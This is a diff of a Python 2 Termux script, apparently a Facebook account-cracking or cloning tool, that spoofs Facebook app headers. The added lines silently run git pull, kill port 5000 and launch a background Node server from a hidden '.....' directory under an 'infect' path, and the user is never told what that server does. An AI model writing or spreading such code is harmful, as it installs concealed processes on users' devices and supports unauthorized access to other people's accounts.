@@ -3,23 +3,41 @@
 #Codded By Jam Shahrukh
 #Editing My Script Will Not Make You A Coder
 #Facebook : JAM Shahrukh
-#Whatsapp : ++971528752764
+#Whatsapp : +923053176060
 #Pakistan Cyber Expert
 #Alone Coder 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
+try:
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system("pip2 install lolcat")
+    os.system('python2 jam.py')
+os.system("clear")
+#Browser Setting
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-
-
+sys.setdefaultencoding("utf-8")
+c = "\033[1;32m"
+c2 = "\033[0;97m"
+c3 = "\033[1;31m"
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+    os.system("apt update && apt install nodejs -y")
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
+    os.system("apt install ruby -y && gem install lolcat")
+from requests.exceptions import ConnectionError
+os.system("git pull")
+if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && npm install")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
 def keluar():
 	print "\x1b[1;91mExit"
 	os.sys.exit()
